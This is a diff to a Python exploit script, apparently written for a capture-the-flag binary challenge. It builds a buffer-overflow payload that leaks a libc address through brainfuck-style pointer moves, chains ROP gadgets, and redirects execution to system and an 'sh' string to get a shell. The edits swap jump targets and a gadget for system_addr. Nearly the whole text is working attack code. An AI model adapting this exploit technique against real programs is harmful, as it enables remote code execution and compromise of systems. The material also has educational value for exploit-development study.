@@ -49,9 +49,12 @@ return_addr = libc_base + 0x00003980 # return from program - we call it since if
 arbitrary_bash_addr = 0xffffcc0c
 new_esp_val = 0x12345678
 #payload=padding+p32(0xdeadbeef)+p32(execve_addr)+p32(return_addr)+p32(sh_addr)+p32(0xffff2222)+p32(0xffff1234)+p32(sh_addr)+ p32(new_esp_val)
-jmp_back_to_heap_1 = 0x804b0eb
-payload = padding + p32(0xdeadbeef) +  p32(jmp_back_to_heap_1)+ p32(jmp_back_to_heap_1)
+jmp_back_to_code_start = 0x8048470
+#payload=padding+p32(0xdeadbeef)+p32(0x0804857d)+p32(0x0804857d)+p32(sh_addr)+p32(0xffff2222)+p32(0xffff1234)+p32(sh_addr)+ p32(new_esp_val)
+jmp_back_to_code_start = 0x8048470
 print(f"sh_addr: {str(sh_addr)}")
+good_jump_addr = 0x0804857d
+payload = padding + p32(0xdeadbeef) +  p32(good_jump_addr)
 payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b".>.>.>." # leak the address of libc
 payload += b"<<<" # leak the address of libc
@@ -98,7 +101,7 @@ heap_rop_nop = libc_addr + 0x0000c30c
 print(f"heap nop rop : {hex(heap_rop_nop)}")
 payload =my_rop
 heap_rop_push_edx = libc_addr + 0x0013cfd8
-payload += p32(heap_rop_push_edx)
+payload += p32(system_addr)
 conn.sendline(payload)
 with open("payload", "ab+") as f:
     f.write(payload)
